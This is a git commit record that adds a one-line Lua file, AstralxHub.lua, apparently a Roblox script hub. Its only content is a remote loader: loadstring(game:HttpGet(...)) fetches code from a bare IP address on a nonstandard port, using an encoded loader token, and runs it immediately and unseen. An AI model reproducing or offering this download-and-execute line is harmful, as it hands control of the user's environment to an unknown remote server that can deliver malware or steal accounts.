6a9e5bf07a63db310c813735b3dd6a9544dadfe7
kondosca <rootu.arvind@gmail.com>
2025-12-28 17:59:12 -0600

    Create AstralxHub.lua

---
+++ AstralxHub.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6Ijk0OTMxZTRkLTEwNzMtNDFjYS04N2UwLWIyNzJmNDkyM2I5NiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
